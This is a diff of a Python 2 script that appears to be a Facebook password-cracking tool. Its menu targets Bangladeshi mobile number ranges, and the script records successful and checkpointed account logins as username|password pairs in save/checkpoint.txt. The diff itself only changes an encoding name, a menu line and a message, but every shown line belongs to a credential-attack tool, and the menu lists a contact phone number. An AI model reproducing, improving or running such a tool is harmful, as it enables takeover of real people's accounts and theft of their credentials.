@@ -32,7 +32,7 @@ from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
 reload(sys)
-sys.setdefaultencoding('utf11')
+sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
@@ -144,7 +144,7 @@ def menu():
     jalan('\x1b[1;96m[6]  \x1b[1;96mGRAMEENPHONE \x1b[1;91m(NEW)')
     jalan('\x1b[1;92m[7]  \x1b[1;92mBANGLALINK \x1b[1;91m(NEW)')
     print
-    jalan('\x1b[1;90m[8] FIND ME ON FACEBOOK GROUP')
+    jalan('\x1b[1;90m[8] Warning👉 incorrect Pass Try To 11digit ')
     jalan('\x1b[1;90m[9] TO CONTACT +8801747951169')
     print
     jalan('\x1b[1;97m[00]  EXIT')
@@ -312,7 +312,7 @@ def action():
                 okb.close()
                 oks.append(c + user + c + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[CP-BHT-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 10 Days]\n'
+                print '\x1b[1;96m[CP-BHT-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 07 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + c + pass1 + '\n')
                 cps.close()
